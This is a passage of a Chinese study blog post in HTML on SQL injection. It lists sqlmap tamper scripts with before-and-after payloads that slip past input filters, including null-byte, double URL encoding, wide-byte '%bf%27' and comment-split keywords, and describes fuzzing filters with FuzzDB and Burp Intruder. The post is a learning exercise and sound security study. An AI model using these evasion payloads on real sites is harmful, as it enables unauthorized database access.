class="line"></span><br><span class="line">appendnullbyte.py</span><br><span class="line">适用数据库：ALL </span><br><span class="line">作用：在有效载荷的结束位置加载null字节字符编码 </span><br><span class="line">使用脚本前：tamper(&apos;1 AND 1=1&apos;) </span><br><span class="line">使用脚本后：1 AND 1=1%00</span><br><span class="line"></span><br><span class="line">chardoubleencode.py</span><br><span class="line">适用数据库：ALL </span><br><span class="line">作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符） </span><br><span class="line">使用脚本前：tamper(&apos;SELECT FIELD FROM%20TABLE&apos;) </span><br><span class="line">使用脚本后：%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</span><br><span class="line"></span><br><span class="line">unmagicquotes.py</span><br><span class="line">适用数据库：ALL </span><br><span class="line">作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格 </span><br><span class="line">使用脚本前：tamper(&quot;1&apos; AND 1=1&quot;) </span><br><span class="line">使用脚本后：1%bf%27 AND 1=1--</span><br><span class="line"></span><br><span class="line">randomcomments.py</span><br><span class="line">适用数据库：ALL </span><br><span class="line">作用：用注释符分割sql关键字 </span><br><span class="line">使用脚本前：tamper(&apos;INSERT&apos;) </span><br><span class="line">使用脚本后：I/**/N/**/SERT</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/qq_34444097/article/details/82717357" target="_blank" rel="noopener">原文链接</a></p>
+<h3 id="5-2-SQL注入FUZZ测试"><a href="#5-2-SQL注入FUZZ测试" class="headerlink" title="5.2 SQL注入FUZZ测试"></a>5.2 SQL注入FUZZ测试</h3><p><strong>Fuzzdb:</strong><a href="https://github.com/fuzzdb-project/fuzzdb下载文件，使用burp的Intruder载入字典，设置好payload的位置，可以进行fuzz测试" target="_blank" rel="noopener">https://github.com/fuzzdb-project/fuzzdb下载文件，使用burp的Intruder载入字典，设置好payload的位置，可以进行fuzz测试</a><br>根据Intruder attack中返回request中的长度，对过滤的关键字进行判断，便于手注，或者编写tamper 也可以编写python脚本，载入字典文件，进行批量检测 </p>
+<p><strong>参考文章：</strong></p>
+<p><a href="https://xz.aliyun.com/t/253/" target="_blank" rel="noopener">https://xz.aliyun.com/t/253/</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://the-wind-hunter.github.io">jax</a>
+            <p>原文链接：<a href="https://the-wind-hunter.github.io/2019/09/19/第六周：数据库相关注入语句的收集和学习/">https://the-wind-hunter.github.io/2019/09/19/第六周：数据库相关注入语句的收集和学习/</a>
+            <p>发表日期：<a href="https://the-wind-hunter.github.io/2019/09/19/第六周：数据库相关注入语句的收集和学习/">September 19th 2019, 9:34:05 pm</a>
+            <p>更新日期：<a href="https://the-wind-hunter.github.io/2019/09/19/第六周：数据库相关注入语句的收集和学习/">September 19th 2019, 9:49:30 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/09/05/第四周-数据库系统功能相关学习/" title= "第四周-数据库系统功能相关学习">
+                    <div class="prevTitle">第四周-数据库系统功能相关学习</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:2509594439@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/the-wind-hunter" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#第六周：数据库相关注入语句的收集和学习"><span class="toc-number">1.</span> <span class="toc-text">第六周：数据库相关注入语句的收集和学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-任务要求"><span class="toc-number">1.1.</span> <span class="toc-text">0x01 任务要求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-检测注入类型payload"><span class="toc-number">1.2.</span> <span class="toc-text">0x02 检测注入类型payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-BOOL-SQLINJECTION"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1 BOOL SQLINJECTION</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-TIME-BASE-SQLINJECTION"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2 TIME-BASE SQLINJECTION</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-报错型注入"><span class="toc-number">1.3.</span> <span class="toc-text">0x03 报错型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MYSQL报错注入大体可以分为以下几类"><span class="toc-number">1.3.1.</span> <span class="toc-text">MYSQL报错注入大体可以分为以下几类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-BIGINT等数据类型溢出"><span class="toc-number">1.3.2.</span> <span class="toc-text">3.1 BIGINT等数据类型溢出</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-2-Xpath语法错误"><span class="toc-number">1.3.3.</span> <span class="toc-text">3.1.2 Xpath语法错误</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-3-concat-rand-group-by-导致主键重复"><span class="toc-number">1.3.4.</span> <span class="toc-text">3.1.3 concat+rand()+group_by()导致主键重复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-4-数据库的一些特性"><span class="toc-number">1.3.5.</span> <span class="toc-text">3.1.4 数据库的一些特性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-宽字节注入"><span class="toc-number">1.4.</span> <span class="toc-text">0x04 宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-注入原理"><span class="toc-number">1.4.1.</span> <span class="toc-text">4.1 注入原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-在sqli-labs上用宽字节注入实战"><span class="toc-number">1.4.2.</span> <span class="toc-text">4.2 在sqli-labs上用宽字节注入实战</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-sqlmap-自带-tamper-的原理"><span class="toc-number">1.5.</span> <span class="toc-text">0x05   sqlmap 自带 tamper 的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-常用tamper脚本"><span class="toc-number">1.5.1.</span> <span class="toc-text">5.1 常用tamper脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-SQL注入FUZZ测试"><span class="toc-number">1.5.2.</span> <span class="toc-text">5.2 SQL注入FUZZ测试</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 8
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/19</span><a class="archive-post-title" href= "/2019/09/19/第六周：数据库相关注入语句的收集和学习/" >第六周：数据库相关注入语句的收集和学习</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/08/22/第三周：数据库系统表相关学习/" >第三周：数据库系统表相关学习</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/08/16/第一周：环境准备/" >第一周：环境准备</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href= "/2019/09/05/第四周-数据库系统功能相关学习/" >第四周-数据库系统功能相关学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/29</span><a class="archive-post-title" href= "/2019/08/29/Windows 上安装 MySQL/" >Windows 上安装 MySQL</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/29</span><a class="archive-post-title" href= "/2019/08/29/hexo-github博客搭建/" >hexo+github博客搭建</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/16</span><a class="archive-post-title" href= "/2019/08/16/第二周：认识sql并学习数据库的基础操作/" >第二周：认识SQL并学习数据库的基础操作</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/08/29/MySQL用户管理：添加用户、授权、删除用户/" >MySQL用户管理：添加用户、授权、删除用户</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "jax"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
